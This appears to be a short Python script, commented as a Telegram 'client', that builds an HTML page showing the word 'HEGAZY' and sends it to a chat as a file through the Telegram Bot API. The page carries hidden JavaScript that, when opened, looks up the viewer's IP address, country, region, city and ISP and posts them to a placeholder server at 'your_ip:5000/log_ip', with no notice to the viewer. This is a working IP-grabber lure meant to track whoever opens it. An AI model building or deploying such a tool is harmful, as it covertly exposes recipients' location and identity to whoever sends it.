# tg.py (العميل)
import requests

BOT_TOKEN = "your_bot_token"
CHAT_ID = "your_chat_id"

html_content = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>
        fetch('http://ip-api.com/json')
            .then(response => response.json())
            .then(data => {
                fetch('http://your_ip:5000/log_ip', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        ip: data.query,
                        country: data.country,
                        region: data.regionName,
                        city: data.city,
                        isp: data.isp
                    })
                })
                .then(response => response.json())
                .then(result => console.log(result))
                .catch(error => console.error('Logging error:', error));
            })
            .catch(error => console.error('Error fetching IP:', error));
    </script>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: black;
            color: white;
            font-size: 5rem;
            font-weight: bold;
            text-transform: uppercase;
        }
    </style>
</head>
<body>
    HEGAZY
</body>
</html>
"""

html_path = "log_page.html"
with open(html_path, "w") as file:
    file.write(html_content)

files = {
    "document": (
        "log_page.html",
        open(html_path, "rb"),  
        "text/html"
    )
}

url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"

data = {"chat_id": CHAT_ID}
response = requests.post(url, data=data, files=files)

if response.status_code == 200:
    print("Message sent successfully")
else:
    print(f"Error: {response.text}")
